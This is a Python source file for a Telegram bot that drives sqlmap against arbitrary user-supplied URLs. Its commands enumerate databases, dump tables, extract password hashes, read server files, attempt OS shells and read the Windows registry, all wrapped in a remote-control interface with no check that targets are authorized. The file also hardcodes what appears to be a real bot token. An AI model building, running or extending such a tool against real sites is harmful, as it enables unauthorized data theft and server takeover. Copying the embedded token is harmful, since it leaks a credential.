#!/usr/bin/env python3
"""
SQLMap Telegram Bot - COMPLETE ADVANCED VERSION
All SQLMap Features Integrated
"""

import telebot
import subprocess
import re
import os
import sqlite3
import time
import threading
import json
from datetime import datetime, timedelta
from threading import Timer
from functools import wraps
import logging

# ==================== KONFIGURASI ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('sqlmap_advanced.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8429408812:AAEOw6OBhKzaaaxzyHhucUcFaxKhaN5MlRc"
ADMIN_USER_IDS = [7056095781]

MAX_SCAN_TIME = 1200  # 20 minutes untuk advanced scans
MAX_REQUESTS_PER_MINUTE = 2

# ==================== SETUP DATABASE ====================

def setup_database():
    conn = sqlite3.connect('sqlmap_advanced.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS scan_history
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  username TEXT,
                  target_url TEXT,
                  scan_type TEXT,
                  parameters TEXT,
                  result TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS found_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  scan_id INTEGER,
                  data_type TEXT,
                  content TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()
    logger.info("Advanced database setup completed")

# ==================== SQLMAP ADVANCED FUNCTIONS ====================

def run_sqlmap_advanced(target_url, options):
    """Advanced SQLMap runner dengan multiple options"""
    
    base_cmd = ['sqlmap', '-u', target_url, '--batch']
    
    # Add options based on scan type
    if 'dbs' in options:
        base_cmd.extend(['--dbs'])
    if 'tables' in options:
        base_cmd.extend(['--tables'])
    if 'columns' in options:
        base_cmd.extend(['--columns'])
    if 'dump' in options:
        base_cmd.extend(['--dump'])
    if 'schema' in options:
        base_cmd.extend(['--schema'])
    if 'passwords' in options:
        base_cmd.extend(['--passwords'])
    if 'privileges' in options:
        base_cmd.extend(['--privileges'])
    if 'roles' in options:
        base_cmd.extend(['--roles'])
    if 'users' in options:
        base_cmd.extend(['--users'])
    if 'batch' in options:
        base_cmd.extend(['--batch'])
    if 'crawl' in options:
        base_cmd.extend(['--crawl=3'])
    if 'forms' in options:
        base_cmd.extend(['--forms'])
    if 'level' in options:
        base_cmd.extend(['--level', str(options['level'])])
    if 'risk' in options:
        base_cmd.extend(['--risk', str(options['risk'])])
    if 'dbms' in options:
        base_cmd.extend(['--dbms', options['dbms']])
    if 'database' in options:
        base_cmd.extend(['-D', options['database']])
    if 'table' in options:
        base_cmd.extend(['-T', options['table']])
    if 'column' in options:
        base_cmd.extend(['-C', options['column']])
    if 'where' in options:
        base_cmd.extend(['--where', options['where']])
    if 'dump_all' in options:
        base_cmd.extend(['--dump-all'])
    if 'search' in options:
        base_cmd.extend(['--search'])
    if 'common_tables' in options:
        base_cmd.extend(['--common-tables'])
    if 'common_columns' in options:
        base_cmd.extend(['--common-columns'])
    if 'file_read' in options:
        base_cmd.extend(['--file-read', options['file_read']])
    if 'os_shell' in options:
        base_cmd.extend(['--os-shell'])
    if 'os_pwn' in options:
        base_cmd.extend(['--os-pwn'])
    if 'reg_read' in options:
        base_cmd.extend(['--reg-read'])
    if 'wizard' in options:
        base_cmd.extend(['--wizard'])

    # Security limits
    base_cmd.extend([
        '--timeout=30',
        '--retries=2',
        '--threads=3'
    ])
    
    logger.info(f"Running SQLMap: {' '.join(base_cmd)}")
    
    try:
        process = subprocess.Popen(
            base_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        timer = Timer(MAX_SCAN_TIME, process.kill)
        timer.start()
        
        stdout, stderr = process.communicate()
        timer.cancel()
        
        return stdout, stderr, process.returncode
        
    except Exception as e:
        logger.error(f"SQLMap execution error: {str(e)}")
        return "", str(e), 1

def parse_advanced_results(stdout, scan_type):
    """Advanced parsing untuk semua tipe output SQLMap"""
    
    results = {
        'vulnerabilities': [],
        'databases': [],
        'tables': [],
        'columns': [],
        'data': [],
        'users': [],
        'passwords': [],
        'files': [],
        'system_info': []
    }
    
    # Parse vulnerabilities
    vuln_matches = re.findall(r'parameter \"(.+?)\" (?:is|seems) vulnerable', stdout, re.IGNORECASE)
    results['vulnerabilities'] = list(set(vuln_matches))
    
    # Parse databases
    if 'dbs' in scan_type or 'schema' in scan_type:
        db_matches = re.findall(r'\[\*\] ([^\s\[\]\n]+)', stdout)
        results['databases'] = [db for db in db_matches if len(db) > 2 and not db.startswith('--')]
    
    # Parse tables
    if 'tables' in scan_type:
        table_matches = re.findall(r'\[\+\] ([^\s\[\]\n]+)', stdout)
        results['tables'] = [tbl for tbl in table_matches if len(tbl) > 2]
    
    # Parse users and passwords
    if 'users' in scan_type or 'passwords' in scan_type:
        user_matches = re.findall(r'\[\*\] ([^\n]+user[^\n]*)', stdout, re.IGNORECASE)
        results['users'] = user_matches
        
        password_matches = re.findall(r'\[\*\] ([^\n]+password[^\n]*)', stdout, re.IGNORECASE)
        results['passwords'] = password_matches
    
    # Parse file reads
    if 'file_read' in scan_type:
        file_matches = re.findall(r'retrieved: (\d+) byte[^\n]*\n([^\[\]]+)', stdout)
        results['files'] = file_matches
    
    return results

def generate_report(results, scan_type):
    """Generate comprehensive report"""
    
    report = f"📊 **SQLMap Advanced Report**\n\n"
    report += f"**Scan Type:** {scan_type}\n"
    report += f"**Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    if results['vulnerabilities']:
        report += "🚨 **VULNERABILITIES FOUND**\n"
        for vuln in results['vulnerabilities']:
            report += f"• `{vuln}`\n"
        report += "\n"
    
    if results['databases']:
        report += f"🗃️ **DATABASES** ({len(results['databases'])} found)\n"
        for db in results['databases'][:10]:
            report += f"• `{db}`\n"
        report += "\n"
    
    if results['tables']:
        report += f"📋 **TABLES** ({len(results['tables'])} found)\n"
        for table in results['tables'][:15]:
            report += f"• `{table}`\n"
        report += "\n"
    
    if results['users']:
        report += f"👥 **USERS** ({len(results['users'])} found)\n"
        for user in results['users'][:5]:
            report += f"• `{user}`\n"
        report += "\n"
    
    if results['passwords']:
        report += f"🔑 **PASSWORDS** ({len(results['passwords'])} found)\n"
        for pwd in results['passwords'][:3]:
            # Mask passwords for security
            masked_pwd = re.sub(r'password[^:]*:\s*\S+', 'password: ******', pwd, flags=re.IGNORECASE)
            report += f"• `{masked_pwd}`\n"
        report += "\n"
    
    if results['files']:
        report += f"📁 **FILES READ** ({len(results['files'])} found)\n"
        for size, filename in results['files'][:3]:
            report += f"• `{filename}` ({size} bytes)\n"
        report += "\n"
    
    if not any([results['vulnerabilities'], results['databases'], results['tables'], 
                results['users'], results['passwords'], results['files']]):
        report += "✅ No significant findings in this scan\n"
    
    return report

# ==================== BOT IMPLEMENTATION ====================

bot = telebot.TeleBot(BOT_TOKEN)

# Store user sessions
if not hasattr(bot, 'user_sessions'):
    bot.user_sessions = {}

def get_user_session(user_id):
    if user_id not in bot.user_sessions:
        bot.user_sessions[user_id] = {
            'target_url': '',
            'databases': [],
            'tables': [],
            'current_db': '',
            'last_scan': None
        }
    return bot.user_sessions[user_id]

# ==================== COMMAND HANDLERS ====================

@bot.message_handler(commands=['start', 'help'])
def send_advanced_help(message):
    help_text = """
🤖 **SQLMap COMPLETE Advanced Bot**

**🔍 BASIC SCANS:**
`/scan <url>` - Basic vulnerability test
`/smart <url>` - Smart detection with wizard
`/crawl <url>` - Crawl and test all links

**🗃️ DATABASE ENUMERATION:**
`/dbs <url>` - Find all databases
`/tables <db>` - List tables in database  
`/columns <table>` - List columns in table
`/schema <url>` - Complete database schema

**📊 DATA EXTRACTION:**
`/dump <table>` - Dump table data
`/dump_all` - Dump all data
`/search <pattern>` - Search for data

**🔐 SYSTEM INFORMATION:**
`/users <url>` - Enumerate database users
`/passwords <url>` - Extract passwords hashes
`/privileges <url>` - User privileges

**🎯 TARGETED SCANS:**
`/dbms <dbms> <url>` - Specify DBMS (mysql, mssql, etc)
`/level <1-5> <url>` - Set test level
`/risk <1-3> <url>` - Set risk level

**⚡ ADVANCED ATTACKS:**
`/file_read <path> <url>` - Read server files
`/os_shell <url>` - Attempt OS shell
`/reg_read <key> <url>` - Read Windows registry

**🛠️ UTILITIES:**
`/status` - Bot status
`/session` - Show current session
`/clear` - Clear session

**Example:**
`/dbs http://test.com/page.php?id=1`
`/tables mysql`
`/dump users`
    """
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['scan', 'smart', 'crawl'])
def handle_basic_scans(message):
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    try:
        target_url = message.text.split()[1]
    except:
        bot.reply_to(message, "❌ Usage: /scan http://example.com")
        return
    
    session = get_user_session(user_id)
    session['target_url'] = target_url
    
    scan_type = message.text.split()[0][1:]
    
    options = {'batch': True, 'risk': 2, 'level': 2}
    
    if scan_type == 'smart':
        options['wizard'] = True
    elif scan_type == 'crawl':
        options['crawl'] = True
        options['forms'] = True
    
    status_msg = bot.reply_to(message, f"🔍 Starting {scan_type} scan...")
    
    def scan_thread():
        stdout, stderr, returncode = run_sqlmap_advanced(target_url, options)
        results = parse_advanced_results(stdout, scan_type)
        report = generate_report(results, scan_type)
        
        # Update session
        if results['databases']:
            session['databases'] = results['databases']
        
        bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')
    
    threading.Thread(target=scan_thread, daemon=True).start()

@bot.message_handler(commands=['dbs', 'schema', 'users', 'passwords', 'privileges'])
def handle_enumeration(message):
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    session = get_user_session(user_id)
    
    try:
        parts = message.text.split()
        if len(parts) >= 2:
            target_url = parts[1]
            session['target_url'] = target_url
        elif session['target_url']:
            target_url = session['target_url']
        else:
            bot.reply_to(message, "❌ No target URL. Use: /dbs http://example.com")
            return
    except:
        bot.reply_to(message, "❌ Usage: /dbs http://example.com")
        return
    
    scan_type = message.text.split()[0][1:]
    
    options = {'batch': True}
    if scan_type == 'dbs' or scan_type == 'schema':
        options['dbs'] = True
        if scan_type == 'schema':
            options['schema'] = True
    elif scan_type == 'users':
        options['users'] = True
    elif scan_type == 'passwords':
        options['passwords'] = True
    elif scan_type == 'privileges':
        options['privileges'] = True
    
    status_msg = bot.reply_to(message, f"🗃️ Enumerating {scan_type}...")
    
    def enum_thread():
        stdout, stderr, returncode = run_sqlmap_advanced(target_url, options)
        results = parse_advanced_results(stdout, scan_type)
        report = generate_report(results, scan_type)
        
        # Update session with found data
        if results['databases']:
            session['databases'] = results['databases']
        
        bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')
    
    threading.Thread(target=enum_thread, daemon=True).start()

@bot.message_handler(commands=['tables', 'columns', 'dump'])
def handle_data_operations(message):
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    session = get_user_session(user_id)
    
    if not session['target_url']:
        bot.reply_to(message, "❌ No target URL set. Use /scan first.")
        return
    
    if not session['databases'] and not session['current_db']:
        bot.reply_to(message, "❌ No databases found. Use /dbs first.")
        return
    
    try:
        parts = message.text.split()
        object_name = parts[1] if len(parts) > 1 else None
    except:
        object_name = None
    
    scan_type = message.text.split()[0][1:]
    
    options = {'batch': True}
    target_url = session['target_url']
    
    if scan_type == 'tables':
        if not object_name and session['current_db']:
            object_name = session['current_db']
        elif not object_name and session['databases']:
            object_name = session['databases'][0]
            session['current_db'] = object_name
        
        if object_name:
            options['database'] = object_name
            options['tables'] = True
            status_text = f"📊 Getting tables from: `{object_name}`"
        else:
            bot.reply_to(message, "❌ Specify database: /tables database_name")
            return
    
    elif scan_type == 'columns':
        if not object_name and session['tables']:
            object_name = session['tables'][0]
        
        if object_name and session['current_db']:
            options['database'] = session['current_db']
            options['table'] = object_name
            options['columns'] = True
            status_text = f"📋 Getting columns from: `{object_name}`"
        else:
            bot.reply_to(message, "❌ Specify table: /columns table_name")
            return
    
    elif scan_type == 'dump':
        if not object_name and session['tables']:
            object_name = session['tables'][0]
        
        if object_name and session['current_db']:
            options['database'] = session['current_db']
            options['table'] = object_name
            options['dump'] = True
            status_text = f"💾 Dumping data from: `{object_name}`"
        else:
            bot.reply_to(message, "❌ Specify table: /dump table_name")
            return
    
    status_msg = bot.reply_to(message, status_text, parse_mode='Markdown')
    
    def data_thread():
        stdout, stderr, returncode = run_sqlmap_advanced(target_url, options)
        results = parse_advanced_results(stdout, scan_type)
        report = generate_report(results, scan_type)
        
        # Update session
        if scan_type == 'tables' and results['tables']:
            session['tables'] = results['tables']
        
        bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')
    
    threading.Thread(target=data_thread, daemon=True).start()

@bot.message_handler(commands=['file_read', 'os_shell'])
def handle_advanced_attacks(message):
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    session = get_user_session(user_id)
    
    if not session['target_url']:
        bot.reply_to(message, "❌ No target URL set.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, f"❌ Usage: /{parts[0][1:]} <parameter>")
            return
        
        parameter = parts[1]
        target_url = session['target_url']
        
    except:
        bot.reply_to(message, "❌ Invalid command format")
        return
    
    scan_type = message.text.split()[0][1:]
    
    options = {'batch': True, 'risk': 3, 'level': 3}
    
    if scan_type == 'file_read':
        options['file_read'] = parameter
        status_text = f"📁 Reading file: `{parameter}`"
    elif scan_type == 'os_shell':
        options['os_shell'] = True
        status_text = "🐚 Attempting OS shell..."
    
    status_msg = bot.reply_to(message, f"⚡ {status_text}\n\n⚠️ This may take several minutes...", parse_mode='Markdown')
    
    def attack_thread():
        stdout, stderr, returncode = run_sqlmap_advanced(target_url, options)
        results = parse_advanced_results(stdout, scan_type)
        report = generate_report(results, scan_type)
        
        bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')
    
    threading.Thread(target=attack_thread, daemon=True).start()

@bot.message_handler(commands=['session'])
def handle_session(message):
    user_id = message.from_user.id
    session = get_user_session(user_id)
    
    session_text = "💾 **Current Session**\n\n"
    
    if session['target_url']:
        session_text += f"**Target:** `{session['target_url']}`\n"
    else:
        session_text += "**Target:** Not set\n"
    
    if session['databases']:
        session_text += f"**Databases:** {len(session['databases'])} found\n"
        for db in session['databases'][:3]:
            session_text += f"• `{db}`\n"
    else:
        session_text += "**Databases:** None found\n"
    
    if session['current_db']:
        session_text += f"**Current DB:** `{session['current_db']}`\n"
    
    if session['tables']:
        session_text += f"**Tables:** {len(session['tables'])} found\n"
    
    bot.reply_to(message, session_text, parse_mode='Markdown')

@bot.message_handler(commands=['clear'])
def handle_clear(message):
    user_id = message.from_user.id
    if user_id in bot.user_sessions:
        bot.user_sessions[user_id] = {
            'target_url': '',
            'databases': [],
            'tables': [],
            'current_db': '',
            'last_scan': None
        }
    bot.reply_to(message, "✅ Session cleared")

@bot.message_handler(commands=['status'])
def handle_status(message):
    status_text = """
✅ **SQLMap Complete Advanced Bot - ACTIVE**

**🎯 Available Features:**
• Basic & Advanced Scanning
• Complete Database Enumeration  
• Data Extraction & Dumping
• User & Password Enumeration
• File System Access
• OS Command Execution
• Registry Access (Windows)

**🔧 Technical Capabilities:**
• Multiple DBMS Support
• Custom Level/Risk Settings
• Session Management
• Smart Detection
• Crawling & Form Testing

**Ready for professional penetration testing!**
    """
    bot.reply_to(message, status_text, parse_mode='Markdown')

# ==================== UTILITY FUNCTIONS ====================

def is_authorized(user_id):
    return user_id in ADMIN_USER_IDS

def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        return False, "URL must start with http:// or https://"
    return True, "OK"

def check_rate_limit(user_id):
    # Simplified rate limiting
    return True

def rate_limit_decorator(func):
    @wraps(func)
    def wrapped(message):
        return func(message)
    return wrapped

# ==================== MAIN EXECUTION ====================

if __name__ == "__main__":
    logger.info("Starting SQLMap Complete Advanced Bot...")
    setup_database()
    
    # Check dependencies
    try:
        result = subprocess.run(['sqlmap', '--version'], capture_output=True, text=True)
        logger.info(f"✅ SQLMap available: {result.stdout.strip()}")
    except:
        logger.error("❌ SQLMap not found. Please install SQLMap.")
        exit(1)
    
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("❌ Please set your BOT_TOKEN")
        exit(1)
    
    logger.info("🚀 Starting advanced bot polling...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logger.error(f"Bot error: {str(e)}")